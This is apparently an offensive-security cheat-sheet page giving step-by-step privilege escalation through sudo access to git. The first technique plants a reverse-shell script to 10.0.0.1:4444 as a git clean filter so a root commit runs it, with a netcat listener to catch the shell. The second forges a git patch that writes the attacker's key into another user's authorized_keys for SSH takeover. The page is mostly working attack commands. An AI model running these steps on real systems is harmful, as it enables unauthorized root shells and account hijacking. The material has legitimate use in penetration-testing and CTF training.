---
title: Sudo Git Privilege Escalation
description: Sudo git is vulnerable to privilege escalation.
tags:
    - Privilege Escalation
refs:
date: 2023-07-23
draft: false
---

## Git Add/Commit

```bash
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m "commit"
```

If we can commit the git repository as root, we may be able to escalate privileges.

### Exploitation

1. **Create a Payload**

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' > /tmp/revshell
chmod +x /tmp/revshell
```

2. **Set Git Config**

```bash
# Go to the git repository
cd /opt/example
git init
echo '*.php filter=indent' > .git/info/attributes
git config filter.indent.clean /tmp/revshell
```

3. **Commit the Repository**

Before committing, we need to start a listener in local machine.

```bash
nc -lvnp 4444
```

Then commit with sudo.

```bash
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m "commit"
```

Now we should get a shell in local terminal.

<br />

## Git Apply

```bash
sudo /usr/bin/git apply *
```

If we can apply the patch for the git repository, we can update the content of arbitrary file.

### Exploitation with SSH Keys

Assume we are currently "user1" user then we want to escalate to be "user2".  
First we create a new SSH key.

```bash
cd /home/user1
ssh-keygen -t rsa
Enter file in which to save the key (/home/user1/.ssh/id_rsa): id_rsa
```

New SSH keys (private/public) are generated under **`/home/user1`**.  
Next, add the content of **`id_rsa.pub`** into **`authorized_keys.`**.

```bash
cat /home/user1/id_rsa.pub > /home/user1/.ssh/authorized_keys
```

Then create a patch.

```bash
cd /home
git diff user1/.bash_history user1/.ssh/authorized_keys > /tmp/patch
```

After that, replace the name “user1” with “user2” in the patch file.  

```bash
sed -i 's/user1/user2/g' /tmp/patch
```

Now we can apply the patch as root. This command update the target user’s ("user2") **`authorization_keys`** to allow us to login with SSH key as "user2".

```bash
sudo /usr/bin/git apply /tmp/patch
ssh -i /home/user1/.ssh/id_rsa user2@example.com
```